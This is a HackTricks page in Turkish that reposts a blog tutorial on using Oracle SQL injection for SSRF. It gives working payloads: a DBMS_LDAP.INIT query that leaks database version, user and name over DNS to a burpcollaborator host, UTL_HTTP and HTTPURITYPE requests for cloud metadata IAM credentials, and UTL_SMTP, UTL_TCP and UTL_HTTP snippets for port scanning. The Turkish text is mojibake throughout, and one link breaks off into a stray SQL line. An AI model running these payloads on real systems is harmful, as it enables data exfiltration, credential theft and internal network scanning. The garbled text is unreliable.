# Oracle enjeksiyonu

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmaya Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklam vermek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARINA**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

**Bu gÃ¶nderiyi silinen gÃ¶nderinin [https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/) Wayback Machine kopyasÄ± olarak sunun.**

## SSRF

Oracle'Ä± kullanarak Out of Band HTTP ve DNS istekleri yapmak, enjeksiyonlarda SQL verilerini dÄ±ÅŸarÄ± Ã§Ä±karmak iÃ§in iyi belgelenmiÅŸtir. Bu teknikleri/fonksiyonlarÄ± her zaman diÄŸer SSRF/XSPA iÅŸlemleri iÃ§in de deÄŸiÅŸtirebiliriz.

Oracle kurulumu gerÃ§ekten zorlayÄ±cÄ± olabilir, Ã¶zellikle komutlarÄ± denemek iÃ§in hÄ±zlÄ± bir Ã¶rnek oluÅŸturmak isterseniz. [Appsecco](https://appsecco.com)'daki arkadaÅŸÄ±m ve meslektaÅŸÄ±m [Abhisek Datta](https://github.com/abhisek), [https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c) adresine yÃ¶nlendirdi ve bu sayede bir t2.large AWS Ubuntu makinesinde ve Docker Ã¼zerinde bir Ã¶rnek kurulum yapabildim.

Docker komutunu `--network="host"` bayraÄŸÄ±yla Ã§alÄ±ÅŸtÄ±rdÄ±m, bÃ¶ylece bu blog yazÄ±sÄ± sÃ¼resince Oracle'Ä± tam aÄŸ eriÅŸimi olan yerel bir kurulum gibi taklit edebildim.
```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c
```
#### Bir URL veya Bir Ana Bilgisayar AdÄ±/Port NumarasÄ± belirtimi destekleyen Oracle paketleri <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

Bir ana bilgisayar ve port belirtimini destekleyen herhangi bir paket ve fonksiyonu bulmak iÃ§in, [Oracle VeritabanÄ± Ã‡evrimiÃ§i Belgeleri](https://docs.oracle.com/database/121/index.html) Ã¼zerinde bir Google aramasÄ± yaptÄ±m. Ã–zellikle,
```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```
Arama aÅŸaÄŸÄ±daki sonuÃ§larÄ± dÃ¶ndÃ¼rdÃ¼ (hepsi dÄ±ÅŸ aÄŸa Ã§Ä±kÄ±ÅŸ yapmak iÃ§in kullanÄ±lamaz):

* DBMS\_NETWORK\_ACL\_ADMIN
* UTL\_SMTP
* DBMS\_XDB
* DBMS\_SCHEDULER
* DBMS\_XDB\_CONFIG
* DBMS\_AQ
* UTL\_MAIL
* DBMS\_AQELM
* DBMS\_NETWORK\_ACL\_UTILITY
* DBMS\_MGD\_ID\_UTL
* UTL\_TCP
* DBMS\_MGWADM
* DBMS\_STREAMS\_ADM
* UTL\_HTTP

Bu basit arama aÃ§Ä±kÃ§asÄ± `DBMS_LDAP` gibi paketleri atlar (hostname ve port numarasÄ± geÃ§meyi saÄŸlar) Ã§Ã¼nkÃ¼ [belgelendirme sayfasÄ±](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360) sizi [farklÄ± bir konuma](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360) yÃ¶nlendirir. Bu nedenle, gÃ¶zden kaÃ§Ä±rdÄ±ÄŸÄ±m baÅŸka Oracle paketleri olabilir.

Her durumda, keÅŸfettiÄŸimiz ve yukarÄ±da listelenen bazÄ± paketlere bir gÃ¶z atalÄ±m.

**DBMS\_LDAP.INIT**

`DBMS_LDAP` paketi, LDAP sunucularÄ±ndan veri eriÅŸimine izin verir. `init()` iÅŸlevi, bir LDAP sunucusuyla bir oturumu baÅŸlatÄ±r ve bir hostname ve port numarasÄ±nÄ± argÃ¼man olarak alÄ±r.

Bu iÅŸlev daha Ã¶nce DNS Ã¼zerinden veri sÄ±zdÄ±rma gÃ¶stermek iÃ§in belgelenmiÅŸtir, Ã¶rneÄŸin aÅŸaÄŸÄ±daki gibi:
```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```
Ancak, iÅŸlevin bir ana bilgisayar adÄ± ve bir baÄŸlantÄ± noktasÄ± numarasÄ± kabul ettiÄŸi gÃ¶z Ã¶nÃ¼ne alÄ±ndÄ±ÄŸÄ±nda, bunu bir baÄŸlantÄ± noktasÄ± tarayÄ±cÄ±sÄ± gibi Ã§alÄ±ÅŸtÄ±rmak iÃ§in de kullanabilirsiniz.

Ä°ÅŸte birkaÃ§ Ã¶rnek:
```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```
`ORA-31203: DBMS_LDAP: PL/SQL - BaÅŸlatma BaÅŸarÄ±sÄ±z.` hatasÄ±, bir oturum deÄŸeri aÃ§Ä±k olan baÄŸlantÄ± noktasÄ±na iÅŸaret ederken, baÄŸlantÄ± noktasÄ±nÄ±n kapalÄ± olduÄŸunu gÃ¶sterir.

**UTL\_SMTP**

`UTL_SMTP` paketi, SMTP Ã¼zerinden e-posta gÃ¶ndermek iÃ§in tasarlanmÄ±ÅŸtÄ±r. [Oracle belgelendirme sitesindeki Ã¶rnek, bu paketi kullanarak nasÄ±l bir e-posta gÃ¶nderebileceÄŸinizi gÃ¶stermektedir](https://docs.oracle.com/database/121/ARPLS/u\_smtp.htm#ARPLS71478). Ancak bizim iÃ§in ilginÃ§ olan ÅŸey, bir ana bilgisayar ve baÄŸlantÄ± noktasÄ± belirtme yeteneÄŸidir.

AÅŸaÄŸÄ±da, `UTL_SMTP.OPEN_CONNECTION` iÅŸleviyle 2 saniyelik bir zaman aÅŸÄ±mÄ± ile basit bir Ã¶rnek gÃ¶sterilmektedir.
```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```
`ORA-29276: transfer timeout` hatasÄ±, portun aÃ§Ä±k olduÄŸunu ancak SMTP baÄŸlantÄ±sÄ±nÄ±n kurulmadÄ±ÄŸÄ±nÄ± gÃ¶sterirken, `ORA-29278: SMTP transient error: 421 Service not available` hatasÄ±, portun kapalÄ± olduÄŸunu gÃ¶sterir.

**UTL\_TCP**

`UTL_TCP` paketi ve iÅŸlemleri, [TCP/IP tabanlÄ± hizmetlerle iletiÅŸim kurmayÄ±](https://docs.oracle.com/cd/B28359\_01/appdev.111/b28419/u\_tcp.htm#i1004190) saÄŸlar. Belirli bir hizmet iÃ§in programlandÄ±ÄŸÄ±nda, bu paket aÄŸa giriÅŸ yolu haline gelebilir veya bir TCP/IP baÄŸlantÄ±sÄ±nÄ±n tÃ¼m yÃ¶nlerini kontrol ederek tam Sunucu TarafÄ± Ä°stekler gerÃ§ekleÅŸtirebilir.

Oracle belgelendirme sitesindeki Ã¶rnek [bu paketi kullanarak bir web sayfasÄ±nÄ± almak iÃ§in raw bir TCP baÄŸlantÄ±sÄ± yapabileceÄŸinizi gÃ¶stermektedir](https://docs.oracle.com/cd/B28359\_01/appdev.111/b28419/u\_tcp.htm#i1004190). Biz bunu biraz daha basitleÅŸtirerek, Ã¶rneÄŸin meta veri Ã¶rneÄŸine veya herhangi bir TCP/IP hizmetine istek yapmak iÃ§in kullanabiliriz.
```
set serveroutput on size 30000;
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
/
```

```
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
```
Ä°lginÃ§ bir ÅŸekilde, ham TCP istekleri oluÅŸturma yeteneÄŸi sayesinde bu paket, TCP isteÄŸi iÃ§inde yÃ¶ntem tÃ¼rÃ¼ ve ek baÅŸlÄ±klarÄ±n da iletilmesiyle tÃ¼m bulut saÄŸlayÄ±cÄ±larÄ±n Ã–rnek meta veri hizmetini sorgulamak iÃ§in de kullanÄ±labilir.

**UTL\_HTTP ve Web Ä°stekleri**

Belki de her Oracle SQL Injection dÄ±ÅŸÄ±nda OOB (Out of Band) Oracle SQL Injection Ã¶ÄŸreticisinde en yaygÄ±n ve geniÅŸ belgelenmiÅŸ teknik olan [`UTL_HTTP` paketi](https://docs.oracle.com/database/121/ARPLS/u\_http.htm#ARPLS070). Bu paket, belgelerde ÅŸu ÅŸekilde tanÄ±mlanmÄ±ÅŸtÄ±r - `UTL_HTTP paketi, SQL ve PL/SQL'den Hypertext Transfer Protocol (HTTP) Ã§aÄŸrÄ±larÄ± yapar. Ä°nternet Ã¼zerindeki verilere HTTP Ã¼zerinden eriÅŸmek iÃ§in kullanabilirsiniz.`
```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```
AyrÄ±ca, ÅŸu gibi sorgularla basit bir port taramasÄ± yapmak iÃ§in bunu da kullanabilirsiniz:
```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```
`ORA-12541: TNS:no listener` veya `TNS:operation timed out` hatasÄ±, TCP baÄŸlantÄ± noktasÄ±nÄ±n kapalÄ± olduÄŸunun bir iÅŸaretidir, oysa `ORA-29263: HTTP protocol error` veya veri, baÄŸlantÄ± noktasÄ±nÄ±n aÃ§Ä±k olduÄŸunun bir iÅŸaretidir.

GeÃ§miÅŸte deÄŸiÅŸen baÅŸarÄ±yla kullandÄ±ÄŸÄ±m baÅŸka bir paket, [`HTTPURITYPE` Oracle soyut tipinin `GETCLOB()` yÃ¶ntemidir](https://docs.oracle.com/database/121/ARPLS/t\_dburi.htm#ARPLS71705). Bu yÃ¶ntem, bir URL ile etkileÅŸimde bulunmanÄ±za ve HTTP protokolÃ¼ iÃ§in destek saÄŸlar. `GETCLOB()` yÃ¶ntemi, bir URL'den GET yanÄ±tÄ±nÄ± [CLOB veri tÃ¼rÃ¼ olarak almak iÃ§in kullanÄ±lÄ±r.](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html)[select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() from dual;

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ± gÃ¶rmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARI'na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
